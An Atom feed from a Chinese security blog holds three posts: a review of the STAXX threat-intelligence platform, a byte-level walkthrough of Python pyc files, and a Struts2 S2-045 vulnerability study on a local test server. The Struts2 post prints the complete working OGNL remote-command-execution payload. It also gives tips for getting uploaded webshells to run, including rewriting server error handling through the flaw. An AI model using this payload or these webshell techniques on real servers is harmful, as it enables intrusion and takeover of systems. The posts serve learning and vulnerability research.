<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>零の杂货铺</title>
  <subtitle>Free and Share</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://phantom0301.coding.me/"/>
  <updated>2017-03-27T13:27:09.144Z</updated>
  <id>http://phantom0301.coding.me/</id>
  
  <author>
    <name>Phantom</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ANOMALI STAXX威胁情报订阅分析系统把玩</title>
    <link href="http://phantom0301.coding.me/2017/03/27/staxx/"/>
    <id>http://phantom0301.coding.me/2017/03/27/staxx/</id>
    <published>2017-03-27T12:35:24.000Z</published>
    <updated>2017-03-27T13:27:09.144Z</updated>
    
    <content type="html">&lt;p&gt;ANOMALI公司就是以前的ThreatStream，以前我研究过的MHN就是出自他手，其实本来是在找MHN的一些资料的，结果无意中看见了它家的威胁情报订阅系统STAXX，就把玩了一下。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-威胁情报标准&quot;&gt;&lt;a href=&quot;#0x01-威胁情报标准&quot; class=&quot;headerlink&quot; title=&quot;0x01 威胁情报标准&quot;&gt;&lt;/a&gt;0x01 威胁情报标准&lt;/h2&gt;&lt;p&gt;大名鼎鼎的STIX、CybOX和TAXII，网上有很多资料，懒的找的话可以邮件向我索取一些我之前收集的相关资料，当然，如果我不犯懒的话，会回应邮件的。：）&lt;/p&gt;
&lt;h2 id=&quot;0x02-STAXX配置&quot;&gt;&lt;a href=&quot;#0x02-STAXX配置&quot; class=&quot;headerlink&quot; title=&quot;0x02 STAXX配置&quot;&gt;&lt;/a&gt;0x02 STAXX配置&lt;/h2&gt;&lt;p&gt;既然是把玩，就不一板一眼的翻译官档了。&lt;/p&gt;
&lt;p&gt;从ANOMALI的官网上可以直接下到STAXX的虚拟机文件，双击直接安装完成。开启机器后在页面上显示主机账号密码以及URL。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327204644.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;浏览器登录系统后，使用页面上提示的账号密码进入WEB端，一路配置到第三步&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327194728.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里官档提供了一个免费的feed server，我有找了一个一起提供给大家。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;http://hailataxii.com/taxii-discovery-service&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://hailataxii.com/taxii-discovery-service&lt;/a&gt; guest/guest&lt;br&gt;    &lt;a href=&quot;https://intelfeed.malwerewolf.com/taxii-discovery-service&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://intelfeed.malwerewolf.com/taxii-discovery-service&lt;/a&gt; guest/guest&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果你有更多的feed server也希望能够喵我，让我也能订阅到更多的信息。&lt;/p&gt;
&lt;p&gt;订阅成功后，就到第5步，这里选择需要订阅的具体条目，以及订阅刷新时间，ident等配置信息。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327195025.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;订阅好后，记得去配置（右上角齿轮一样的图标）里刷新一下，过一会儿，就可以在面板里查看pull到的信息了。&lt;/p&gt;
&lt;h2 id=&quot;0x03-DASHBOARD&quot;&gt;&lt;a href=&quot;#0x03-DASHBOARD&quot; class=&quot;headerlink&quot; title=&quot;0x03 DASHBOARD&quot;&gt;&lt;/a&gt;0x03 DASHBOARD&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327205415.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;上面五颜六色的就是订阅到的信息，左起第一幅图是不同时间段提供的指示器信息，有包括钓鱼网站URL、apt URL、恶意邮件、洋葱ip、cc等等信息，我们点击一个apt URL来看一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327205736.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;点击相应的URL就可以进入到ANOMALI网站下查看详细信息。&lt;/p&gt;
&lt;p&gt;左起第二幅图是一个安全态势的查看，可以查阅当前情报不同危险等级的数量。&lt;/p&gt;
&lt;p&gt;第二列第一幅图是信息来源的统计，紧接着是标签统计和可信度的分析。&lt;/p&gt;
&lt;h2 id=&quot;0x04-ACTIVITY-amp-IMPORT&quot;&gt;&lt;a href=&quot;#0x04-ACTIVITY-amp-IMPORT&quot; class=&quot;headerlink&quot; title=&quot;0x04 ACTIVITY &amp;amp; IMPORT&quot;&gt;&lt;/a&gt;0x04 ACTIVITY &amp;amp; IMPORT&lt;/h2&gt;&lt;p&gt;这个版面提供动态查看情报的功能，并且支持数据导出，如果你有自己的feed收集器，也可以通过这里把自己的威胁情报信息push给其他的服务器使用。&lt;/p&gt;
&lt;p&gt;另外在IMPORT可以自定义导入TXT文本做解析，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170327210956.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;不过它这里的文本匹配规则很迷，你可以随意喂给它一个TXT文本看看就知道了。&lt;/p&gt;
&lt;h2 id=&quot;0x05-小结&quot;&gt;&lt;a href=&quot;#0x05-小结&quot; class=&quot;headerlink&quot; title=&quot;0x05 ## 小结&quot;&gt;&lt;/a&gt;0x05 ## 小结&lt;/h2&gt;&lt;p&gt;作为开源软件，STAXX还是有它的亮点，提供简便的威胁情报标准订阅，以及简洁的图表分析。不过，这种功能暂时看来又有些鸡肋，从公共威胁情报来说，开放的feed不是太多，从私有威胁情报来说，部署一整套完整的威胁收集到分析系统性价比又值得商榷。而且，对于普通的公司来说，每天分析这么多来自于全世界的威胁信息恐怕也不现实吧~~&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;ANOMALI公司就是以前的ThreatStream，以前我研究过的MHN就是出自他手，其实本来是在找MHN的一些资料的，结果无意中看见了它家的威胁情报订阅系统STAXX，就把玩了一下。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://phantom0301.coding.me/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="威胁情报，taxii" scheme="http://phantom0301.coding.me/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%8Ctaxii/"/>
    
  </entry>
  
  <entry>
    <title>Python与它的opcode</title>
    <link href="http://phantom0301.coding.me/2017/03/24/pythonopcode/"/>
    <id>http://phantom0301.coding.me/2017/03/24/pythonopcode/</id>
    <published>2017-03-24T07:26:29.000Z</published>
    <updated>2017-03-25T01:59:01.143Z</updated>
    
    <content type="html">&lt;p&gt;0CTF中有一道opcode修改的题，当时觉得除了暴力尝试还原外没有什么更好的思路，结果后来看到了别人的write up，还真是暴力尝试~~&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-PyCodeObject&quot;&gt;&lt;a href=&quot;#0x01-PyCodeObject&quot; class=&quot;headerlink&quot; title=&quot;0x01 PyCodeObject&quot;&gt;&lt;/a&gt;0x01 PyCodeObject&lt;/h2&gt;&lt;p&gt;Python代码在运行时，将我们写的源码转换成字节码，再由python解释器来执行字节码。而字节码就是一个PyCodeObject对象。一个相应的对象如下：文件在/include/code.h&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* Bytecode object */
typedef struct {
    PyObject_HEAD
    int co_argcount;        /* #arguments, except *args */
    int co_nlocals;        /* #local variables */
    int co_stacksize;        /* #entries needed for evaluation stack */
    int co_flags;        /* CO_..., see below */
    PyObject *co_code;        /* 编译所得的字节码指令序列 */
    PyObject *co_consts;    /* Block中所有常量的元组 */
    PyObject *co_names;        /* 所有名字的元组 */
    PyObject *co_varnames;    /* 在本代码段中赋值，但没有被内层代码引用的变量*/
    PyObject *co_freevars;    /* 在本层引用，在外层赋值的变量*/
    PyObject *co_cellvars;      /* 本层赋值，且被内层代码段引用的变量*/
    /* The rest doesn&amp;apos;t count for hash/cmp */
    PyObject *co_filename;    /* python文件路径*/
    PyObject *co_name;        /* 函数名或类名*/
    int co_firstlineno;        /* Block所在的起始行*/
    PyObject *co_lnotab;    /* 字节码指令与pyc文件中的source code对应关系*/
    void *co_zombieframe;     /* 优化(see frameobject.c) */
    PyObject *co_weakreflist;   /* to support weakrefs to code objects */
} PyCodeObject;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从这个定义中，我们可以简单了解一下，该对象有哪些参数组成：&lt;/p&gt;
&lt;p&gt;1 co_argcount，一个Code Bloack的参数计数。&lt;/p&gt;
&lt;p&gt;作为萌新，这里再多提一下python中的几种参数形式,python中的参数形式可以分成位置参数和关键字参数两类，位置参数即参数所在的位置影响它被处理的逻辑，关键字参数即参数所在的位置与它的处理逻辑无关。&lt;/p&gt;
&lt;p&gt;另一个概念是，Code Block，这个概念是说我们所写的Python代码中的每一个名字空间在编译时都会对应一个Code Block，每一个Block会创建一个PyCodeObject对象&lt;/p&gt;
&lt;p&gt;那么这样的话，我们就可以理解这个参数做了什么，我们写一段代码来做个测试，看这样一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def co_arg(fn):
    print fn.__name__,fn.__code__.co_argcount
@co_arg
def f1():
    pass
@co_arg
def f2(a):
    pass
@co_arg
def f3(a,b):
    pass
@co_arg
def f4(a,b=1):
    pass
@co_arg
def f5(a,b,*c):
    pass
@co_arg
def f6(a,b,*c,**d):
    pass
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;f1 0
&amp;gt;&amp;gt;f2 1
&amp;gt;&amp;gt;f3 2
&amp;gt;&amp;gt;f4 2
&amp;gt;&amp;gt;f5 2
&amp;gt;&amp;gt;f6 2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;OK，我们可以看到这个变量记录了函数的参数个数，但不记录tuple参数和dict参数&lt;/p&gt;
&lt;p&gt;2 co_nlocals，一个Code Bloack的局部变量计数，包括所有参数和局部变量。&lt;/p&gt;
&lt;p&gt;同样看如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def co_nlo(fn):
    print fn.__name__,fn.__code__.co_nlocals
@co_nlo
def f1():
    pass
@co_nlo
def f2(a):
    pass
@co_nlo
def f3(a):
    b=1
@co_nlo
def f4(a,*b,**c):
    d=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;f1 0
&amp;gt;&amp;gt;f2 1
&amp;gt;&amp;gt;f3 2
&amp;gt;&amp;gt;f4 4
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3 co_stacksize,运行这段Code Block需要的栈空间&lt;/p&gt;
&lt;p&gt;剩下的解释就直接标注在上面的type结构中。&lt;/p&gt;
&lt;p&gt;了解过PyCodeObject后，我们就可以来看看pyc，一般情况下，翻译的字节码会写入内存中，当程序结束后，会根据程序运行的方式来决定是否将字节码写入pyc或者其他格式的存储文件中。&lt;/p&gt;
&lt;p&gt;我们来看一下一个简单的pyc文件。&lt;/p&gt;
&lt;h2 id=&quot;0x02-pyc&quot;&gt;&lt;a href=&quot;#0x02-pyc&quot; class=&quot;headerlink&quot; title=&quot;0x02 pyc&quot;&gt;&lt;/a&gt;0x02 pyc&lt;/h2&gt;&lt;p&gt;我们编译如下代码到pyc来进行学习：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def foo():
    print 1
if __name__ == &amp;apos;__main__&amp;apos;:
    foo()
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;python -m py_compile hello.py&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;编译后的代码如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170324171322.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看上述pyc图，头4个字节，&lt;em&gt;03f3 0d0a&lt;/em&gt; 是pyc的MAGIC数，用来表示python的版本。接下来的4个字节是时间。头声明完后的是一个Block的开头，即为63，后面的4个字节是PyObject中的argument数，这里为0，接着4个字节是nlocals，这里还是0。接着是4个字节的栈空间&lt;em&gt;，0200 0000&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;接着4个字节的flags &lt;em&gt;4000 0000&lt;/em&gt;。flag后面就是一些具体到代码的字节码。&lt;/p&gt;
&lt;p&gt;开始是co_code，0x73，代表类型s（string），接下来的4个字节代表长度  2300 0000&lt;br&gt;使用小端模式，表示有35个字节长度。&lt;/p&gt;
&lt;p&gt;接下来我们向后取35个字节长度，这时的字节码就可以对应上opcode，都2个字节对应相应opcode操作，如果操作后带有值，那么就在紧跟其后的4个字节中表示。&lt;/p&gt;
&lt;p&gt;完整的版本如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;03f3 0d0a 版本
76e2 d458 时间
63  block
0000 0000 argument
0000 0000 nlocals
0200 0000 栈空间
4000 0000 flags
73 类型 string
2300 0000 长度 35 bytes
64 00 00 LOAD_CONST  0
84 00 00 MAKE_FUNCTION 0
5a 00 00 STORE_NAME 0
65 01 00 LOAD_NAME 1
64 01 00 LOAD_CONST 1
6b 02 00 COMPARE_OP 2
72 1f 00 POP_JUMP_IF_FALSE
65 00 00 LOAD_NAME 0
83 00 00 CALL_FUNCTION 0
01 POP_TOP
6e 00 00 JUMP_FORWARD 0
64 02 00 LOAD_CONST 2
53 RETURN_VALUE

28 (
0300 0000 

63 
0000 0000
0000 0000
0100 0000
4300 0000
73 
0900 0000 
64 01 00
47
48
64 00 00 
53

28 (
0200 0000 
4e N
69 0100 0000 1

28 (
0000 0000
28 (
0000 0000 
28 (
0000 0000
28 (
0000 0000 

73 string  co_filename
3000 0000
屏蔽敏感信息

74 t co_name
0300 0000 
666f6f  foo

0100 0000
73 
0200 0000 
00 01 
74
0800 0000
5f5f 6d61 696e 5f5f

4e N
28
0200 0000
52 R
0000 0000 
74
0800 0000
5f 5f6e 616d 655f5f

28 0000 0000 
28 0000 0000
28 0000 0000

73  co_filename
30 0000 00
屏蔽敏感信息

74  co_name
0800 0000 
3c6d 6f64 756c 653e &amp;lt;module&amp;gt;

0100 0000 

73
0400 0000
0903 0c01 lnotab
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下，第一个block其实可以看成是main主程序的执行，第二个block就是foo函数中执行print的逻辑。&lt;/p&gt;
&lt;p&gt;看这两张图，在对比我上面的字节码，应该就能懂了。&lt;/p&gt;
&lt;p&gt;block 1&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170324204233.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;block 2&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170324204343.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而opcode对应的操作，可以查看python目录下的opcode.py&lt;/p&gt;
&lt;h2 id=&quot;0x03-一道0ctf题&quot;&gt;&lt;a href=&quot;#0x03-一道0ctf题&quot; class=&quot;headerlink&quot; title=&quot;0x03 一道0ctf题&quot;&gt;&lt;/a&gt;0x03 一道0ctf题&lt;/h2&gt;&lt;p&gt;在明白了上述原理后，可以参考这篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://0x48.pw/2017/03/20/0x2f/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://0x48.pw/2017/03/20/0x2f/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;0CTF中有一道opcode修改的题，当时觉得除了暴力尝试还原外没有什么更好的思路，结果后来看到了别人的write up，还真是暴力尝试~~&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="http://phantom0301.coding.me/categories/python/"/>
    
    
      <category term="opcode" scheme="http://phantom0301.coding.me/tags/opcode/"/>
    
      <category term="python" scheme="http://phantom0301.coding.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-S2-045漏洞学习及其他</title>
    <link href="http://phantom0301.coding.me/2017/03/13/struts2/"/>
    <id>http://phantom0301.coding.me/2017/03/13/struts2/</id>
    <published>2017-03-13T11:30:45.000Z</published>
    <updated>2017-03-23T08:30:19.524Z</updated>
    
    <content type="html">&lt;p&gt;Struts2的环境有时候显得有些庞大而复杂，这里借着漏洞学习的过程了解一下Tomcat+Struts2架构的一些问题，这么一看重要的学习其他而不是漏洞了~~。&lt;/p&gt;
&lt;p&gt;修改：2017.3.23&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-Java-Tomcat-Struts2&quot;&gt;&lt;a href=&quot;#0x01-Java-Tomcat-Struts2&quot; class=&quot;headerlink&quot; title=&quot;0x01 Java+Tomcat+Struts2&quot;&gt;&lt;/a&gt;0x01 Java+Tomcat+Struts2&lt;/h2&gt;&lt;p&gt;之前很少接触Java环境下的Web问题，对于Jboss，Tomcat，Struts2，Weblogic等等的概念没有一下清晰的认识，通过查阅资料，有了如下的认识。&lt;/p&gt;
&lt;p&gt;首先这些应用都是为了完成一个Java的Web服务，那么，在拥有Java环境的情况下，我们需要一个能够监听Web服务并且调度相关逻辑的服务器，这个就是Tomcat起到的作用。&lt;/p&gt;
&lt;p&gt;和Tomcat具有同样身份作用的还有Jboss，Resin，Glassfish和Weblogic，那么其实Struts2都可以部署在这些Java容器中，这里就以Tomcat为例，一个运行成功的Tomcat应用如下图所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170313200921.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们可以看一下默认的Tomcat目录&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;bin  # 启动/关闭服务的脚本
 |-bootstrap.jar  # 引导程序
 |-commons-daemon.jar  # 守护程序
 |-tomcat-juli.jar  # java util logging 日志管理
 |-daemon.sh
 |-startup.sh
 |-shutdown.sh
 |-setclasspath.sh  # 动态设置JAVA变量,内部使用
 |-digest.sh  #  使用特殊的算法加密
 |-tool-wrapper.sh  # 封装工具，内部使用
 |-version.sh  #  检测版本
 |-configtest.sh  # 测试配置文件语法
 |-catalina.sh  #  启动相应的java程序
 |-catalina-tasks.xml  # 加载包路径
conf
 |-Catalina  # 默认似乎是空的，可以用来配置项目路径
 |-catalina.properties  # catalina的安全设置、类加载设置、字符缓存设置
 |-catalina.policy  # 安全策略
 |-jaspic-providers.xml  # 身份验证模块配置
 |-jaspic-providers.xsd  # 似乎xsd在这里是变量定义 
 |-logging.properties  # 日志记录配置
 |-tomcat-users.xml  
 |-web.xml  # Web基础配置
 |-context.xml  # 配置策略的路径
 |-server.xml  # 服务端信息配置，端口，日志存储方式，根路径等等    
lib
 |-*.jar  # java封装库
logs
 |-*.log  # 日志存储文件
temp
webapps
 |-*.war  # 打包的Web程序
 |-*  # 自动解压的Web 页面程序
work
 |-*  # 对应webapps的类库
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;*安全策略，包括对于一些系统变量的读取限制，特殊的函数执行限制，文件的读写控制&lt;/p&gt;
&lt;p&gt;下图是一张Tomcat的层级关系&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170313211929.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;简单认识了一下Tomcat的结构后，我们来部署一个含有S054漏洞的struts2应用，下载struts2后，拷贝apps中的structs2-blank.war到Tomcat的webapps目录下，重启Tomcat，就会自动解压war包。&lt;/p&gt;
&lt;p&gt;访问 &lt;a href=&quot;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&lt;/a&gt;&lt;br&gt;就可以访问到一个struts自带的欢迎界面&lt;/p&gt;
&lt;p&gt;我们尝试修改解压出来的应用文件夹名为ROOT，发现在没有任何配置的情况下，tomcat会默认访问ROOT文件夹，而其他文件夹可以通过路由访问，当然前提是策略允许访问，&lt;/p&gt;
&lt;p&gt;同时，我在之前提到了路径还可以配置在conf中，我们尝试创建一个指定根路径为structs2-blank的配置文件于conf/Catalina/localhost中也可以实现当Web文件不在webapps中时的路由访问。&lt;/p&gt;
&lt;p&gt;再来看一下struts默认的目录结构&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;docs  # 文档
apps  # struts2的war包，提供样例参考
 |-blank
 |-mailreader
 |-portlet
 |-rest-showcase
 |-showcase
lib  # jar包库
src  # struts2的源码
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们使用blank来做测试用，blank基本展示了struts2应用应该有的几部分：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WEB-INF
|-web.xml  # 过滤器配置文件以及基础路径配置
|-src  # 源码
|-lib  # jar库
|-jsp  # jsp文件夹
|-classes  # 类和其他配置文件文件夹
META-INF  # 元信息
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x02-漏洞测试&quot;&gt;&lt;a href=&quot;#0x02-漏洞测试&quot; class=&quot;headerlink&quot; title=&quot;0x02 漏洞测试&quot;&gt;&lt;/a&gt;0x02 漏洞测试&lt;/h2&gt;&lt;p&gt;这里就直接使用struts2自带的欢迎页面来测试：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://127.0.0.1:8080/struts2-blank/example/HelloWorld.action&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先利用网上流传的工具来进行测试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://123.207.68.169/achiveimg/20170314140943.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;确实存在漏洞，这个时候我们抓包进行细节的复现。在GET包中增加Content-Type字段，使用网上流传的Payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%{
(#nike=&amp;apos;multipart/form-data&amp;apos;).
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;apos;com.opensymphony.xwork2.ActionContext.container&amp;apos;]).
(#ognlUtil=#container.getInstance
(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
(#ognlUtil.getExcludedPackageNames().clear()).
(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess
(#dm)))).(#cmd=&amp;apos;whoami&amp;apos;).(#iswin=(@java.lang.System@getProperty
(&amp;apos;os.name&amp;apos;).toLowerCase().contains(&amp;apos;win&amp;apos;))).(#cmds=(#iswin?
{&amp;apos;cmd.exe&amp;apos;,&amp;apos;/c&amp;apos;,#cmd}:{&amp;apos;/bin/bash&amp;apos;,&amp;apos;-c&amp;apos;,#cmd})).(#p=new 
java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).
(#process=#p.start()).(#ros=
(@org.apache.struts2.ServletActionContext@getResponse
().getOutputStream())).(@org.apache.commons.io.IOUtils@copy
(#process.getInputStream(),#ros)).(#ros.flush())
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对上面一段payload进行格式整理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%{
    (#nike=&amp;apos;multipart/form-data&amp;apos;).  访问非根对象nike
    (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).  调用静态方法
    (
    #_memberAccess?
        (#_memberAccess=#dm):
        (
            (#container=#context[&amp;apos;com.opensymphony.xwork2.ActionContext.container&amp;apos;]).
            (
                #ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)  创建类实例
            ).
            (#ognlUtil.getExcludedPackageNames().clear()).
            (#ognlUtil.getExcludedClasses().clear()).
            (
            #context.setMemberAccess(#dm)
            )
        )
    ).
    (#cmd=&amp;apos;whoami&amp;apos;).
    (
        #iswin=(@java.lang.System@getProperty(&amp;apos;os.name&amp;apos;).toLowerCase().contains(&amp;apos;win&amp;apos;))
    ).
    (
    #cmds=(#iswin?{&amp;apos;cmd.exe&amp;apos;,&amp;apos;/c&amp;apos;,#cmd}:{&amp;apos;/bin/bash&amp;apos;,&amp;apos;-c&amp;apos;,#cmd})
    ).
    (
    #p=new java.lang.ProcessBuilder(#cmds)
    ).
    (#p.redirectErrorStream(true)).
    (#process=#p.start()).
    (
    #ros=
        (
        @org.apache.struts2.ServletActionContext@getResponse().getOutputStream()
        )
    ).
    (
    @org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)
    ).
    (#ros.flush())
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据大牛们的解读文章，可以了解到&lt;/p&gt;
&lt;p&gt;首先是&lt;em&gt;multipart/form-data&lt;/em&gt;绕过类型判断，然后调用了&lt;em&gt;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS&lt;/em&gt;这个方法给了&lt;em&gt;#_memberAccess&lt;/em&gt;这个节点，然后就是利用&lt;em&gt;java.lang.ProcessBuilder&lt;/em&gt;执行预定的cmd命令，对执行后的错误流进行重定向显示。~~当然这只能算是对于这段payload的主观感觉猜测。&lt;/p&gt;
&lt;p&gt;详细的底层分析可以阅读这篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://paper.seebug.org/247/&quot; title=&quot;http://paper.seebug.org/247/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://paper.seebug.org/247/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x03-JSP解析的问题&quot;&gt;&lt;a href=&quot;#0x03-JSP解析的问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 JSP解析的问题&quot;&gt;&lt;/a&gt;0x03 JSP解析的问题&lt;/h2&gt;&lt;p&gt;有朋友在测试时发现，在有漏洞的站点执行命令是很容易的，反弹Shell也可以轻松完成，但上传Webshell就不见得每次都能够顺利完成，而很多时候如果能使用Webshell进行图形界面操作会更加方便。这里就常见的几种上传失败情况进行总结。&lt;/p&gt;
&lt;p&gt;1.上传成功但解析跳转：&lt;/p&gt;
&lt;p&gt;这种情况对应到之前说到的路由关系，我们仍然使用struts2-blank来测试。&lt;/p&gt;
&lt;p&gt;blank默认情况下，有策略限制直接跳转到jsp。&lt;/p&gt;
&lt;p&gt;访问URL：struts2-blank/WEB-INF/jsp/example/Login.jsp，页面会显示403。&lt;br&gt;这个时候发现访问Login.action可以访问成功。此时，如果在当前文件夹下上传test.jsp，必须使用test或者test.action来访问。&lt;/p&gt;
&lt;p&gt;值得一提的是，这种对攻击者上传文件的成功访问是基于以下这条规则：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;action name=&amp;quot;*&amp;quot; class=&amp;quot;example.ExampleSupport&amp;quot;&amp;gt;
    &amp;lt;result&amp;gt;/WEB-INF/jsp/example/{1}.jsp&amp;lt;/result&amp;gt;
&amp;lt;/action&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单解释一下，class相当于处理逻辑（Model？），然后对action 的name进行全匹配，将匹配到的文件名进行相应的jsp（View？）跳转。&lt;/p&gt;
&lt;p&gt;而之所以test和test.action都可以被访问到应该是一种缺省规则，在struts.xml中添加如下规则：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;constant name=&amp;quot;struts.action.extension&amp;quot; value=&amp;quot;action&amp;quot;&amp;gt;&amp;lt;/constant&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，test就无法被访问到。&lt;/p&gt;
&lt;p&gt;从上面这种情况来看，跳转的原因首先是对接收的后缀进行匹配，其次是相关action动作的处理，那么我们就可以通过添加和上面相似的规则来实现Webshell的访问。&lt;/p&gt;
&lt;p&gt;这里就不得不提一下struts的运行机制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;struts.xml,这个按照我的理解就相当于是一个控制器，进行路由控制
    |
    |
   \ /
  class，当路由得到相应的action名后，以相应的method来调用class处理逻辑
    |
    |
   \ /
   jsp,根据处理逻辑的不同，跳转给用户相应的显示页面
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里从我理解的MVC的角度进行解释，根据我查阅的资料，再往下走应该是struts2的filter机制，这里我就先不去理解了。&lt;/p&gt;
&lt;p&gt;2.上传成功，解析出错&lt;/p&gt;
&lt;p&gt;这种情况主要分为两种，一种是解析错但菜刀依然可以执行，另一种是类文件或者库文件缺失，个人猜测通过上传相应的文件到lib或者classes文件夹来进行尝试，但因为缺乏相应的测试条件，这个问题先留在这里，后面实践了再来补写。&lt;/p&gt;
&lt;p&gt;————————————————————2017.3.23 更新&lt;/p&gt;
&lt;p&gt;最近测试的时候发现，解析出错还有一种情况会导致Getshell失败，那就是服务端自己写了错误显示用的jsp，这样就会导致shell上传成功后，显示状态500，一般情况下状态500并不会影响shell连接，但是服务端自己实现500后可能会写入一个跳转操作，跳转回根目录，自然shell就无法访问到。&lt;/p&gt;
&lt;p&gt;这种时候，我们可以利用struts2的漏洞来改写服务端的错误处理代码，禁止出错跳转，是的shell可以被访问到。&lt;/p&gt;
